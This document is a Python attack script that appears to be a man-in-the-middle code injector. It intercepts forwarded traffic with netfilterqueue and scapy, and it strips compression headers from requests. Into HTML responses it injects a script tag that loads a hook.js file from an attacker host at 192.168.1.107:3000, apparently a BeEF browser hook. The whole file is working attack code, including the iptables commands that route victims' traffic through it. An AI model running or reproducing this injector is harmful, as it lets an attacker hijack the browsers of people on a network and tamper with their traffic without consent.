import netfilterqueue as nfq
from termcolor import colored
from os import getuid
from subprocess import call
import scapy.all as scapy
from re import sub, search

code_length = len('<script src="http://192.168.1.107:3000/hook.js"></script>')
code_inject = b'<script src="http://192.168.1.107:3000/hook.js"></script>'


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):

        if scapy_packet[scapy.TCP].dport == 10000:
            # REQUEST
            # change the encode for plain text
            modified_load = sub(b'Accept-Encoding:.*?\\r\\n',
                                b'', scapy_packet[scapy.Raw].load)
            modified_load = modified_load.replace('HTTP/1.1', 'HTTP/1.0')
            scapy_packet[scapy.Raw].load = modified_load
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(bytes(scapy_packet))

        elif scapy_packet[scapy.TCP].sport == 10000:
            # RESPONSE
            load = scapy_packet[scapy.Raw].load
            load = load.replace(b"</body>", code_inject + b"</body>")
            content_length = search(b"(?:Content-Length:\s)(\d*)", load)

            if content_length and b"text/html" in load:

                modified_content_length = int(
                    content_length.group(1).decode()) + code_length
                result = load.replace(content_length.group(
                    1), str(modified_content_length).encode())
                load = result

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                print(
                    f"\nModified load: {colored(new_packet[scapy.Raw].load, 'blue')}")
                packet.set_payload(bytes(new_packet))
                print(f"{colored('[*]', 'green')} Load Done")

    packet.accept()


def check_sudo():
    if getuid() != 0:
        print(
            f"{colored('[-]', 'red')} You must be super user to run this script")
        exit(1)


check_sudo()
call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

queue = nfq.NetfilterQueue()

queue.bind(1, process_packet)
try:
    print(f"{colored('[!]', 'cyan')} Running")
    queue.run()
except KeyboardInterrupt:
    print(f"\n{colored('[!]', 'red')} Exit")
    call('iptables -D FORWARD -j NFQUEUE --queue-num 0', shell=True)
